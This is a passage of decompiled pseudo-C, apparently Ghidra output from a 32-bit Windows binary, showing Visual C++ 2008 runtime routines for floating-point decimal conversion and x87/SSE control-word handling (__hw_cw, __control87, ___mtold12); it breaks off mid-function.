  local_68 = &LAB_00423110;
  uStack_20 = uStack_12;
  if (-uVar16 != 0) {
    iVar5 = param_1;
    uVar14 = -uVar16;
    iVar2 = iVar4;
    if (0 < (int)uVar16) {
      local_68 = &DAT_00423270;
      uVar14 = uVar16;
    }
    while (uVar14 != 0) {
      uStack_20 = (ushort)((uint)iVar5 >> 0x10);
      local_24._2_2_ = (ushort)iVar5;
      iVar4 = CONCAT22(local_c,local_10._2_2_);
      local_68 = local_68 + 0x54;
      if ((uVar14 & 7) != 0) {
        piVar11 = (int *)(local_68 + (uVar14 & 7) * 0xc);
        if (0x7fff < *(ushort *)piVar11) {
          local_40 = (undefined2)*piVar11;
          uStack_3e._0_2_ = (undefined2)((uint)*piVar11 >> 0x10);
          piVar3 = piVar11 + 2;
          uStack_3e._2_2_ = (undefined2)piVar11[1];
          uStack_3a = (ushort)((uint)piVar11[1] >> 0x10);
          piVar11 = (int *)&local_40;
          local_38 = *piVar3;
          iVar2 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e) + -1;
          uStack_3e._0_2_ = (undefined2)iVar2;
          uStack_3e._2_2_ = (undefined2)((uint)iVar2 >> 0x10);
        }
        local_58 = 0;
        local_14 = 0;
        uStack_13 = 0;
        uStack_12 = 0;
        local_10._0_2_ = 0;
        iVar21 = 0;
        local_10._2_2_ = 0;
        local_c = 0;
        iVar4 = 0;
        uStack_a = 0;
        uVar19 = (*(ushort *)((int)piVar11 + 10) ^ CONCAT11(bStack_19,local_1a)) & 0x8000;
        uVar10 = CONCAT11(bStack_19,local_1a) & 0x7fff;
        uVar13 = *(ushort *)((int)piVar11 + 10) & 0x7fff;
        uVar20 = uVar13 + uVar10;
        if (((uVar10 < 0x7fff) && (uVar13 < 0x7fff)) && (uVar20 < 0xbffe)) {
          if (0x3fbf < uVar20) {
            if (((uVar10 == 0) &&
                (uVar20 = uVar20 + 1,
                (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) & 0x7fffffff) == 0)) &&
               ((CONCAT22(uStack_1e,uStack_20) == 0 &&
                (CONCAT22(local_24._2_2_,(undefined2)local_24) == 0)))) {
              local_1a = 0;
              bStack_19 = 0;
              goto LAB_0041a92f;
            }
            if ((((uVar13 == 0) && (uVar20 = uVar20 + 1, (piVar11[2] & 0x7fffffffU) == 0)) &&
                (piVar11[1] == 0)) && (*piVar11 == 0)) goto LAB_0041a74e;
            local_5c = 0;
            puVar25 = &local_10;
            local_44 = 5;
            do {
              local_54 = local_44;
              if (0 < local_44) {
                local_70 = (ushort *)((int)&local_24 + local_5c * 2);
                local_6c = piVar11 + 2;
                do {
                  bVar6 = false;
                  uVar16 = puVar25[-1] + (uint)*local_70 * (uint)*(ushort *)local_6c;
                  if ((uVar16 < (uint)puVar25[-1]) ||
                     (uVar16 < (uint)*local_70 * (uint)*(ushort *)local_6c)) {
                    bVar6 = true;
                  }
                  puVar25[-1] = uVar16;
                  if (bVar6) {
                    *(short *)puVar25 = *(short *)puVar25 + 1;
                  }
                  local_70 = local_70 + 1;
                  local_6c = (int *)((int)local_6c + -2);
                  local_54 = local_54 + -1;
                } while (0 < local_54);
              }
              puVar25 = (undefined4 *)((int)puVar25 + 2);
              local_5c = local_5c + 1;
              local_44 = local_44 + -1;
            } while (0 < local_44);
            uVar20 = uVar20 + 0xc002;
            if ((short)uVar20 < 1) {
LAB_0041a85f:
              uVar20 = uVar20 - 1;
              if ((short)uVar20 < 0) {
                uVar16 = (uint)(ushort)-uVar20;
                uVar20 = 0;
                do {
                  if ((local_14 & 1) != 0) {
                    local_58 = local_58 + 1;
                  }
                  iVar4 = CONCAT22(uStack_a,local_c);
                  uVar22 = CONCAT22(local_10._2_2_,(ushort)local_10);
                  iVar21 = CONCAT22(local_10._2_2_,(ushort)local_10);
                  local_c = (ushort)(CONCAT22(uStack_a,local_c) >> 1);
                  uStack_a = uStack_a >> 1;
                  local_10._2_2_ = local_10._2_2_ >> 1 | (ushort)((uint)(iVar4 << 0x1f) >> 0x10);
                  uVar23 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) >> 1;
                  uStack_12 = uStack_12 >> 1 | (ushort)((uint)(iVar21 << 0x1f) >> 0x10);
                  uVar16 = uVar16 - 1;
                  local_10._0_2_ = (ushort)(uVar22 >> 1);
                  local_14 = (byte)uVar23;
                  uStack_13 = (undefined)(uVar23 >> 8);
                } while (uVar16 != 0);
                if (local_58 != 0) {
                  local_14 = local_14 | 1;
                }
              }
            }
            else {
              do {
                uVar13 = local_10._2_2_;
                uVar10 = uStack_12;
                if ((uStack_a & 0x8000) != 0) break;
                iVar21 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) << 1;
                local_14 = (byte)iVar21;
                uStack_13 = (undefined)((uint)iVar21 >> 8);
                uStack_12 = (ushort)((uint)iVar21 >> 0x10);
                iVar21 = CONCAT22(local_10._2_2_,(ushort)local_10) * 2;
                local_10._0_2_ = (ushort)iVar21 | uVar10 >> 0xf;
                local_10._2_2_ = (ushort)((uint)iVar21 >> 0x10);
                iVar21 = CONCAT22(uStack_a,local_c) * 2;
                local_c = (ushort)iVar21 | uVar13 >> 0xf;
                uVar20 = uVar20 - 1;
                uStack_a = (ushort)((uint)iVar21 >> 0x10);
              } while (0 < (short)uVar20);
              if ((short)uVar20 < 1) goto LAB_0041a85f;
            }
            if ((0x8000 < CONCAT11(uStack_13,local_14)) ||
               (iVar4 = CONCAT22(local_c,local_10._2_2_),
               iVar21 = CONCAT22((ushort)local_10,uStack_12),
               (CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) & 0x1ffff) == 0x18000)) {
              if (CONCAT22((ushort)local_10,uStack_12) == -1) {
                uStack_12 = 0;
                local_10._0_2_ = 0;
                iVar21 = 0;
                if (CONCAT22(local_c,local_10._2_2_) == -1) {
                  local_10._2_2_ = 0;
                  local_c = 0;
                  if (uStack_a == 0xffff) {
                    uStack_a = 0x8000;
                    uVar20 = uVar20 + 1;
                    iVar4 = 0;
                    iVar21 = 0;
                  }
                  else {
                    uStack_a = uStack_a + 1;
                    iVar4 = 0;
                    iVar21 = 0;
                  }
                }
                else {
                  iVar4 = CONCAT22(local_c,local_10._2_2_) + 1;
                  local_10._2_2_ = (ushort)iVar4;
                  local_c = (ushort)((uint)iVar4 >> 0x10);
                }
              }
              else {
                iVar21 = CONCAT22((ushort)local_10,uStack_12) + 1;
                uStack_12 = (ushort)iVar21;
                local_10._0_2_ = (ushort)((uint)iVar21 >> 0x10);
                iVar4 = CONCAT22(local_c,local_10._2_2_);
              }
            }
            local_10._0_2_ = (ushort)((uint)iVar21 >> 0x10);
            uStack_12 = (ushort)iVar21;
            local_c = (ushort)((uint)iVar4 >> 0x10);
            local_10._2_2_ = (ushort)iVar4;
            if (uVar20 < 0x7fff) {
              bStack_19 = (byte)(uVar20 >> 8) | (byte)(uVar19 >> 8);
              local_24._0_2_ = uStack_12;
              local_24._2_2_ = (ushort)local_10;
              uStack_20 = local_10._2_2_;
              iVar5 = CONCAT22(local_10._2_2_,(ushort)local_10);
              uStack_1e = local_c;
              uStack_1c = uStack_a;
              local_1a = (undefined)uVar20;
            }
            else {
              uStack_20 = 0;
              uStack_1e = 0;
              local_24._0_2_ = 0;
              local_24._2_2_ = 0;
              iVar5 = 0;
              iVar12 = ((uVar19 == 0) - 1 & 0x80000000) + 0x7fff8000;
              uStack_1c = (ushort)iVar12;
              local_1a = (undefined)((uint)iVar12 >> 0x10);
              bStack_19 = (byte)((uint)iVar12 >> 0x18);
            }
            goto LAB_0041a92f;
          }
LAB_0041a74e:
          uStack_1c = 0;
          local_1a = 0;
          bStack_19 = 0;
        }
        else {
          iVar21 = ((uVar19 == 0) - 1 & 0x80000000) + 0x7fff8000;
          uStack_1c = (ushort)iVar21;
          local_1a = (undefined)((uint)iVar21 >> 0x10);
          bStack_19 = (byte)((uint)iVar21 >> 0x18);
        }
        uStack_20 = 0;
        uStack_1e = 0;
        local_24._0_2_ = 0;
        local_24._2_2_ = 0;
        iVar5 = 0;
        iVar21 = 0;
        iVar4 = 0;
      }
LAB_0041a92f:
      uStack_20 = (ushort)((uint)iVar5 >> 0x10);
      local_24._2_2_ = (ushort)iVar5;
      local_c = (ushort)((uint)iVar4 >> 0x10);
      local_10._2_2_ = (ushort)iVar4;
      local_10._0_2_ = (ushort)((uint)iVar21 >> 0x10);
      uStack_12 = (ushort)iVar21;
      param_1 = CONCAT22(uStack_12,local_24._2_2_);
      param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
      uVar14 = (int)uVar14 >> 3;
    }
  }
  uStack_12 = (ushort)((uint)param_1 >> 0x10);
  local_24._2_2_ = (ushort)param_1;
  uVar14 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c));
  uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
  if (0x3ffe < (ushort)(uVar14 >> 0x10)) {
    local_50 = local_50 + 1;
    local_54 = 0;
    local_14 = 0;
    uStack_13 = 0;
    uStack_12 = 0;
    local_10._0_2_ = 0;
    local_10._2_2_ = 0;
    local_c = 0;
    uStack_a = 0;
    uVar16 = uVar14 >> 0x10 & 0x7fff;
    iVar21 = uVar16 + 0x3ffb;
    if (((ushort)uVar16 < 0x7fff) && ((ushort)iVar21 < 0xbffe)) {
      if (0x3fbf < (ushort)iVar21) {
        if (((((ushort)uVar16 == 0) &&
             (iVar21 = uVar16 + 0x3ffc,
             (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) & 0x7fffffff) == 0)) &&
            (CONCAT22(uStack_1e,uStack_20) == 0)) &&
           (CONCAT22(local_24._2_2_,(undefined2)local_24) == 0)) {
          local_1a = 0;
          bStack_19 = 0;
          param_2 = 0;
          uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
          goto LAB_0041abf3;
        }
        local_5c = 0;
        puVar25 = &local_10;
        local_44 = 5;
        do {
          local_58 = local_44;
          if (0 < local_44) {
            local_4c = (ushort *)&local_2c;
            puVar8 = (ushort *)((int)&local_24 + local_5c * 2);
            do {
              bVar6 = false;
              uVar16 = puVar25[-1] + (uint)*local_4c * (uint)*puVar8;
              if ((uVar16 < (uint)puVar25[-1]) || (uVar16 < (uint)*local_4c * (uint)*puVar8)) {
                bVar6 = true;
              }
              puVar25[-1] = uVar16;
              if (bVar6) {
                *(short *)puVar25 = *(short *)puVar25 + 1;
              }
              local_4c = local_4c + -1;
              puVar8 = puVar8 + 1;
              local_58 = local_58 + -1;
            } while (0 < local_58);
          }
          puVar25 = (undefined4 *)((int)puVar25 + 2);
          local_5c = local_5c + 1;
          local_44 = local_44 + -1;
        } while (0 < local_44);
        iVar21 = iVar21 + 0xc002;
        if ((short)iVar21 < 1) {
LAB_0041aaec:
          uVar20 = (ushort)(iVar21 + 0xffff);
          if ((short)uVar20 < 0) {
            uVar16 = -(iVar21 + 0xffff);
            uVar14 = uVar16 & 0xffff;
            uVar20 = uVar20 + (short)uVar16;
            do {
              if ((local_14 & 1) != 0) {
                local_54 = local_54 + 1;
              }
              iVar4 = CONCAT22(uStack_a,local_c);
              uVar16 = CONCAT22(local_10._2_2_,(ushort)local_10);
              iVar21 = CONCAT22(local_10._2_2_,(ushort)local_10);
              local_c = (ushort)(CONCAT22(uStack_a,local_c) >> 1);
              uStack_a = uStack_a >> 1;
              local_10._2_2_ = local_10._2_2_ >> 1 | (ushort)((uint)(iVar4 << 0x1f) >> 0x10);
              uVar22 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) >> 1;
              uStack_12 = uStack_12 >> 1 | (ushort)((uint)(iVar21 << 0x1f) >> 0x10);
              uVar14 = uVar14 - 1;
              local_10._0_2_ = (ushort)(uVar16 >> 1);
              local_14 = (byte)uVar22;
              uStack_13 = (undefined)(uVar22 >> 8);
            } while (uVar14 != 0);
            if (local_54 != 0) {
              local_14 = local_14 | 1;
            }
          }
        }
        else {
          do {
            uVar10 = local_10._2_2_;
            uVar20 = uStack_12;
            if ((short)uStack_a < 0) break;
            iVar4 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) << 1;
            local_14 = (byte)iVar4;
            uStack_13 = (undefined)((uint)iVar4 >> 8);
            uStack_12 = (ushort)((uint)iVar4 >> 0x10);
            iVar4 = CONCAT22(local_10._2_2_,(ushort)local_10) * 2;
            local_10._0_2_ = (ushort)iVar4 | uVar20 >> 0xf;
            local_10._2_2_ = (ushort)((uint)iVar4 >> 0x10);
            iVar4 = CONCAT22(uStack_a,local_c) * 2;
            local_c = (ushort)iVar4 | uVar10 >> 0xf;
            iVar21 = iVar21 + 0xffff;
            uStack_a = (ushort)((uint)iVar4 >> 0x10);
          } while (0 < (short)iVar21);
          uVar20 = (ushort)iVar21;
          if ((short)uVar20 < 1) goto LAB_0041aaec;
        }
        if ((0x8000 < CONCAT11(uStack_13,local_14)) ||
           (iVar21 = CONCAT22(local_c,local_10._2_2_), uVar16 = CONCAT22((ushort)local_10,uStack_12)
           , (CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) & 0x1ffff) == 0x18000)) {
          if (CONCAT22((ushort)local_10,uStack_12) == -1) {
            uVar16 = 0;
            if (CONCAT22(local_c,local_10._2_2_) == -1) {
              if (uStack_a == 0xffff) {
                uStack_a = 0x8000;
                uVar20 = uVar20 + 1;
                iVar21 = 0;
                uVar16 = 0;
              }
              else {
                uStack_a = uStack_a + 1;
                iVar21 = 0;
                uVar16 = 0;
              }
            }
            else {
              iVar21 = CONCAT22(local_c,local_10._2_2_) + 1;
            }
          }
          else {
            uVar16 = CONCAT22((ushort)local_10,uStack_12) + 1;
            iVar21 = CONCAT22(local_c,local_10._2_2_);
          }
        }
        local_10._0_2_ = (ushort)(uVar16 >> 0x10);
        uStack_12 = (ushort)uVar16;
        local_c = (ushort)((uint)iVar21 >> 0x10);
        local_10._2_2_ = (ushort)iVar21;
        param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
        if (uVar20 < 0x7fff) {
          bStack_19 = (byte)(uVar20 >> 8) | bStack_19 & 0x80;
          uStack_20 = local_10._2_2_;
          uStack_1e = local_c;
          uStack_1c = uStack_a;
          local_1a = (undefined)uVar20;
        }
        else {
          uStack_20 = 0;
          uStack_1e = 0;
          uVar16 = 0;
          iVar21 = (((bStack_19 & 0x80) == 0) - 1 & 0x80000000) + 0x7fff8000;
          uStack_1c = (ushort)iVar21;
          local_1a = (undefined)((uint)iVar21 >> 0x10);
          bStack_19 = (byte)((uint)iVar21 >> 0x18);
          param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
        }
        goto LAB_0041abf3;
      }
      iVar21 = 0;
    }
    else {
      iVar21 = (((bStack_19 & 0x80) == 0) - 1 & 0x80000000) + 0x7fff8000;
    }
    uStack_1e = 0;
    uStack_20 = 0;
    uStack_1c = (ushort)iVar21;
    local_1a = (undefined)((uint)iVar21 >> 0x10);
    bStack_19 = (byte)((uint)iVar21 >> 0x18);
    param_2 = 0;
    uVar16 = 0;
  }
LAB_0041abf3:
  *param_6 = local_50;
  if (((param_5 & 1) == 0) || (param_4 = param_4 + local_50, 0 < param_4)) {
    if (0x15 < param_4) {
      param_4 = 0x15;
    }
    iVar21 = (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) >> 0x10) - 0x3ffe;
    local_1a = 0;
    bStack_19 = 0;
    local_48 = 8;
    uVar14 = uVar16;
    do {
      uVar16 = uVar14 << 1;
      iVar4 = CONCAT22(uStack_1e,uStack_20) * 2;
      uStack_20 = (ushort)iVar4 | (ushort)(uVar14 >> 0x1f);
      iVar5 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) * 2;
      uStack_1c = (ushort)iVar5 | uStack_1e >> 0xf;
      local_48 = local_48 + -1;
      uStack_1e = (ushort)((uint)iVar4 >> 0x10);
      local_1a = (undefined)((uint)iVar5 >> 0x10);
      bStack_19 = (byte)((uint)iVar5 >> 0x18);
      uVar14 = uVar16;
    } while (local_48 != 0);
    if ((iVar21 < 0) && (uVar22 = -iVar21 & 0xff, uVar22 != 0)) {
      do {
        iVar4 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c));
        uVar23 = CONCAT22(uStack_1e,uStack_20);
        iVar21 = CONCAT22(uStack_1e,uStack_20);
        uVar16 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) >> 1;
        uStack_1c = (ushort)uVar16;
        local_1a = (undefined)(uVar16 >> 0x10);
        bStack_19 = bStack_19 >> 1;
        uStack_1e = uStack_1e >> 1 | (ushort)((uint)(iVar4 << 0x1f) >> 0x10);
        uVar16 = uVar14 >> 1 | iVar21 << 0x1f;
        uVar22 = uVar22 - 1;
        uStack_20 = (ushort)(uVar23 >> 1);
        local_24._0_2_ = (undefined2)(uVar14 >> 1);
        local_24._2_2_ = (ushort)(uVar16 >> 0x10);
        uVar14 = CONCAT22(local_24._2_2_,(undefined2)local_24);
      } while (0 < (int)uVar22);
    }
    psVar1 = param_6 + 2;
    psVar17 = psVar1;
    uVar20 = uStack_1e;
    for (iVar21 = param_4 + 1; 0 < iVar21; iVar21 = iVar21 + -1) {
      local_24._2_2_ = (ushort)(uVar16 >> 0x10);
      local_24._0_2_ = (undefined2)uVar16;
      iVar2 = CONCAT22(uStack_20,local_24._2_2_);
      local_38 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c));
      uVar14 = CONCAT22(uVar20,uStack_20) * 2;
      uVar22 = (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) * 2 | (uint)(uVar20 >> 0xf)) * 2 |
               uVar14 >> 0x1f;
      uVar23 = (uVar14 | local_24._2_2_ >> 0xf) * 2 | (uVar16 << 1) >> 0x1f;
      uVar14 = uVar16 * 5;
      if ((uVar14 < uVar16 * 4) || (uVar24 = uVar23, uVar14 < uVar16)) {
        uVar24 = uVar23 + 1;
        bVar6 = false;
        if ((uVar24 < uVar23) || (uVar24 == 0)) {
          bVar6 = true;
        }
        if (bVar6) {
          uVar22 = uVar22 + 1;
        }
      }
      uVar23 = CONCAT22(uVar20,uStack_20) + uVar24;
      if ((uVar23 < uVar24) || (uVar23 < CONCAT22(uVar20,uStack_20))) {
        uVar22 = uVar22 + 1;
      }
      iVar4 = (uVar22 + local_38) * 2;
      uStack_1c = (ushort)iVar4 | (ushort)(uVar23 >> 0x1f);
      uVar16 = uVar16 * 10;
      local_1a = (undefined)((uint)iVar4 >> 0x10);
      uStack_20 = (ushort)(uVar23 * 2) | (ushort)(uVar14 >> 0x1f);
      *(char *)psVar17 = (char)((uint)iVar4 >> 0x18) + '0';
      psVar17 = (short *)((int)psVar17 + 1);
      uStack_1e = (ushort)(uVar23 * 2 >> 0x10);
      bStack_19 = 0;
      local_40 = (undefined2)local_24;
      uStack_3a = uVar20;
      uVar20 = uStack_1e;
    }
    psVar18 = psVar17 + -1;
    uStack_1e = uVar20;
    if (*(char *)((int)psVar17 + -1) < '5') {
      for (; (psVar1 <= psVar18 && (*(char *)psVar18 == '0'));
          psVar18 = (short *)((int)psVar18 + -1)) {
      }
      if (psVar18 < psVar1) {
        *param_6 = 0;
        *(undefined *)((int)param_6 + 3) = 1;
        *(byte *)(param_6 + 1) = ((uVar9 != 0x8000) - 1U & 0xd) + 0x20;
        *(char *)psVar1 = '0';
        *(undefined *)((int)param_6 + 5) = 0;
        goto LAB_0041adbb;
      }
    }
    else {
      for (; (psVar1 <= psVar18 && (*(char *)psVar18 == '9'));
          psVar18 = (short *)((int)psVar18 + -1)) {
        *(char *)psVar18 = '0';
      }
      if (psVar18 < psVar1) {
        psVar18 = (short *)((int)psVar18 + 1);
        *param_6 = *param_6 + 1;
      }
      *(char *)psVar18 = *(char *)psVar18 + '\x01';
    }
    cVar15 = ((char)psVar18 - (char)param_6) + -3;
    *(char *)((int)param_6 + 3) = cVar15;
    *(undefined *)(cVar15 + 4 + (int)param_6) = 0;
  }
  else {
    *param_6 = 0;
    *(undefined *)((int)param_6 + 3) = 1;
    *(byte *)(param_6 + 1) = ((uVar9 != 0x8000) - 1U & 0xd) + 0x20;
    *(undefined *)(param_6 + 2) = 0x30;
    *(undefined *)((int)param_6 + 5) = 0;
  }
LAB_0041adbb:
  uStack_3e = iVar2;
  local_24 = uVar16;
  local_10 = param_2;
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __hw_cw
// 
// Library: Visual Studio 2008 Release

uint __hw_cw(void)

{
  uint uVar1;
  uint uVar2;
  uint unaff_EBX;
  
  uVar1 = (uint)((unaff_EBX & 0x10) != 0);
  if ((unaff_EBX & 8) != 0) {
    uVar1 = uVar1 | 4;
  }
  if ((unaff_EBX & 4) != 0) {
    uVar1 = uVar1 | 8;
  }
  if ((unaff_EBX & 2) != 0) {
    uVar1 = uVar1 | 0x10;
  }
  if ((unaff_EBX & 1) != 0) {
    uVar1 = uVar1 | 0x20;
  }
  if ((unaff_EBX & 0x80000) != 0) {
    uVar1 = uVar1 | 2;
  }
  uVar2 = unaff_EBX & 0x300;
  if (uVar2 != 0) {
    if (uVar2 == 0x100) {
      uVar1 = uVar1 | 0x400;
    }
    else if (uVar2 == 0x200) {
      uVar1 = uVar1 | 0x800;
    }
    else if (uVar2 == 0x300) {
      uVar1 = uVar1 | 0xc00;
    }
  }
  if ((unaff_EBX & 0x30000) == 0) {
    uVar1 = uVar1 | 0x300;
  }
  else if ((unaff_EBX & 0x30000) == 0x10000) {
    uVar1 = uVar1 | 0x200;
  }
  if ((unaff_EBX & 0x40000) != 0) {
    uVar1 = uVar1 | 0x1000;
  }
  return uVar1;
}



// Library Function - Single Match
//  ___hw_cw_sse2
// 
// Library: Visual Studio 2008 Release

uint __fastcall ___hw_cw_sse2(undefined4 param_1,uint param_2)

{
  uint uVar1;
  uint uVar2;
  
  uVar1 = 0;
  if ((param_2 & 0x10) != 0) {
    uVar1 = 0x80;
  }
  if ((param_2 & 8) != 0) {
    uVar1 = uVar1 | 0x200;
  }
  if ((param_2 & 4) != 0) {
    uVar1 = uVar1 | 0x400;
  }
  if ((param_2 & 2) != 0) {
    uVar1 = uVar1 | 0x800;
  }
  if ((param_2 & 1) != 0) {
    uVar1 = uVar1 | 0x1000;
  }
  if ((param_2 & 0x80000) != 0) {
    uVar1 = uVar1 | 0x100;
  }
  uVar2 = param_2 & 0x300;
  if (uVar2 != 0) {
    if (uVar2 == 0x100) {
      uVar1 = uVar1 | 0x2000;
    }
    else if (uVar2 == 0x200) {
      uVar1 = uVar1 | 0x4000;
    }
    else if (uVar2 == 0x300) {
      uVar1 = uVar1 | 0x6000;
    }
  }
  uVar2 = param_2 & 0x3000000;
  if (uVar2 == 0x1000000) {
    uVar1 = uVar1 | 0x8040;
  }
  else {
    if (uVar2 == 0x2000000) {
      return uVar1 | 0x40;
    }
    if (uVar2 == 0x3000000) {
      return uVar1 | 0x8000;
    }
  }
  return uVar1;
}



// Library Function - Single Match
//  __control87
// 
// Library: Visual Studio 2008 Release

uint __cdecl __control87(uint _NewValue,uint _Mask)

{
  ushort uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  ushort in_FPUControlWord;
  
  uVar5 = 0;
  if ((in_FPUControlWord & 1) != 0) {
    uVar5 = 0x10;
  }
  if ((in_FPUControlWord & 4) != 0) {
    uVar5 = uVar5 | 8;
  }
  if ((in_FPUControlWord & 8) != 0) {
    uVar5 = uVar5 | 4;
  }
  if ((in_FPUControlWord & 0x10) != 0) {
    uVar5 = uVar5 | 2;
  }
  if ((in_FPUControlWord & 0x20) != 0) {
    uVar5 = uVar5 | 1;
  }
  if ((in_FPUControlWord & 2) != 0) {
    uVar5 = uVar5 | 0x80000;
  }
  uVar1 = in_FPUControlWord & 0xc00;
  if ((in_FPUControlWord & 0xc00) != 0) {
    if (uVar1 == 0x400) {
      uVar5 = uVar5 | 0x100;
    }
    else if (uVar1 == 0x800) {
      uVar5 = uVar5 | 0x200;
    }
    else if (uVar1 == 0xc00) {
      uVar5 = uVar5 | 0x300;
    }
  }
  if ((in_FPUControlWord & 0x300) == 0) {
    uVar5 = uVar5 | 0x20000;
  }
  else if ((in_FPUControlWord & 0x300) == 0x200) {
    uVar5 = uVar5 | 0x10000;
  }
  if ((in_FPUControlWord & 0x1000) != 0) {
    uVar5 = uVar5 | 0x40000;
  }
  uVar2 = ~_Mask & uVar5 | _NewValue & _Mask;
  if (uVar2 != uVar5) {
    uVar5 = __hw_cw();
    uVar2 = 0;
    if ((uVar5 & 1) != 0) {
      uVar2 = 0x10;
    }
    if ((uVar5 & 4) != 0) {
      uVar2 = uVar2 | 8;
    }
    if ((uVar5 & 8) != 0) {
      uVar2 = uVar2 | 4;
    }
    if ((uVar5 & 0x10) != 0) {
      uVar2 = uVar2 | 2;
    }
    if ((uVar5 & 0x20) != 0) {
      uVar2 = uVar2 | 1;
    }
    if ((uVar5 & 2) != 0) {
      uVar2 = uVar2 | 0x80000;
    }
    uVar3 = uVar5 & 0xc00;
    if (uVar3 != 0) {
      if (uVar3 == 0x400) {
        uVar2 = uVar2 | 0x100;
      }
      else if (uVar3 == 0x800) {
        uVar2 = uVar2 | 0x200;
      }
      else if (uVar3 == 0xc00) {
        uVar2 = uVar2 | 0x300;
      }
    }
    if ((uVar5 & 0x300) == 0) {
      uVar2 = uVar2 | 0x20000;
    }
    else if ((uVar5 & 0x300) == 0x200) {
      uVar2 = uVar2 | 0x10000;
    }
    if ((uVar5 & 0x1000) != 0) {
      uVar2 = uVar2 | 0x40000;
    }
  }
  uVar5 = 0;
  if (DAT_00424fd4 != 0) {
    if ((char)MXCSR < '\0') {
      uVar5 = 0x10;
    }
    if ((MXCSR & 0x200) != 0) {
      uVar5 = uVar5 | 8;
    }
    if ((MXCSR & 0x400) != 0) {
      uVar5 = uVar5 | 4;
    }
    if ((MXCSR & 0x800) != 0) {
      uVar5 = uVar5 | 2;
    }
    if ((MXCSR & 0x1000) != 0) {
      uVar5 = uVar5 | 1;
    }
    if ((MXCSR & 0x100) != 0) {
      uVar5 = uVar5 | 0x80000;
    }
    uVar3 = MXCSR & 0x6000;
    if (uVar3 != 0) {
      if (uVar3 == 0x2000) {
        uVar5 = uVar5 | 0x100;
      }
      else if (uVar3 == 0x4000) {
        uVar5 = uVar5 | 0x200;
      }
      else if (uVar3 == 0x6000) {
        uVar5 = uVar5 | 0x300;
      }
    }
    uVar4 = MXCSR & 0x8040;
    if (uVar4 == 0x40) {
      uVar5 = uVar5 | 0x2000000;
    }
    else if (uVar4 == 0x8000) {
      uVar5 = uVar5 | 0x3000000;
    }
    else if (uVar4 == 0x8040) {
      uVar5 = uVar5 | 0x1000000;
    }
    uVar4 = ~(_Mask & 0x308031f) & uVar5 | _Mask & 0x308031f & _NewValue;
    if (uVar4 != uVar5) {
      uVar5 = ___hw_cw_sse2(uVar3,uVar4);
      ___set_fpsr_sse2(uVar5);
      uVar5 = 0;
      if ((char)MXCSR < '\0') {
        uVar5 = 0x10;
      }
      if ((MXCSR & 0x200) != 0) {
        uVar5 = uVar5 | 8;
      }
      if ((MXCSR & 0x400) != 0) {
        uVar5 = uVar5 | 4;
      }
      if ((MXCSR & 0x800) != 0) {
        uVar5 = uVar5 | 2;
      }
      if ((MXCSR & 0x1000) != 0) {
        uVar5 = uVar5 | 1;
      }
      if ((MXCSR & 0x100) != 0) {
        uVar5 = uVar5 | 0x80000;
      }
      uVar3 = MXCSR & 0x6000;
      if (uVar3 != 0) {
        if (uVar3 == 0x2000) {
          uVar5 = uVar5 | 0x100;
        }
        else if (uVar3 == 0x4000) {
          uVar5 = uVar5 | 0x200;
        }
        else if (uVar3 == 0x6000) {
          uVar5 = uVar5 | 0x300;
        }
      }
      uVar3 = MXCSR & 0x8040;
      if (uVar3 == 0x40) {
        uVar5 = uVar5 | 0x2000000;
      }
      else if (uVar3 == 0x8000) {
        uVar5 = uVar5 | 0x3000000;
      }
      else if (uVar3 == 0x8040) {
        uVar5 = uVar5 | 0x1000000;
      }
    }
    uVar3 = uVar5 ^ uVar2;
    uVar2 = uVar5 | uVar2;
    if ((uVar3 & 0x8031f) != 0) {
      uVar2 = uVar2 | 0x80000000;
    }
  }
  return uVar2;
}



// Library Function - Single Match
//  ___mtold12
// 
// Library: Visual Studio 2008 Release

void __cdecl ___mtold12(char *param_1,int param_2,uint *param_3)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  bool bVar4;
  bool bVar5;
  short sVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  
  uVar7 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  sVar6 = 0x404e;
  *param_3 = 0;
  param_3[1] = 0;
  param_3[2] = 0;
  if (param_2 != 0) {
    do {
      uVar2 = *param_3;
      uVar10 = *param_3;
      uVar1 = param_3[1];
      uVar11 = param_3[2];
      uVar9 = param_3[1] * 2;
      bVar4 = false;
      uVar8 = (param_3[2] * 2 | param_3[1] >> 0x1f) * 2 | uVar9 >> 0x1f;
      uVar3 = uVar2 * 4;
      uVar9 = (uVar9 | uVar2 >> 0x1f) * 2 | uVar2 * 2 >> 0x1f;
      uVar2 = uVar3 + uVar10;
      *param_3 = uVar3;
      param_3[1] = uVar9;
      param_3[2] = uVar8;
      if ((uVar2 < uVar3) || (uVar2 < uVar10)) {
        bVar4 = true;
      }
      bVar5 = false;
      *param_3 = uVar2;
      if (bVar4) {
        uVar10 = uVar9 + 1;
        if ((uVar10 < uVar9) || (uVar10 == 0)) {
          bVar5 = true;
        }
        param_3[1] = uVar10;
        if (bVar5) {
          param_3[2] = uVar8 + 1;
        }
      }
      uVar10 = param_3[1] + uVar1;
      bVar4 = false;
      if ((uVar10 < param_3[1]) || (uVar10 < uVar1)) {
        bVar4 = true;
      }
